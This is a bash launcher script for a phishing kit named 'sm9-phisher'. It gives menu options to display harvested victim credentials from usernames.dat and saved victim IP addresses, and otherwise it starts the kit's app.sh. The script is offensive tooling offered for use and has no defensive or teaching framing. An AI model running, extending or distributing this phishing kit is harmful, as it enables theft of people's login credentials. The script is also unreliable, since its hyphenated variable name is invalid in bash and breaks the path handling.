if [[ $(uname -o) == *'Android'* ]];then
	SM9-PHISHER_ROOT="/data/data/com.termux/files/home/sm9-phisher"
else
	export SM9-PHISHER_ROOT="/home/sm9-phisher"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run sm9-phisher type \`sm9-phisher\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $SM9-PHISHER_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $SM9-PHISHER_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $SM9-PHISHER_ROOT
	bash ./app.sh
fi
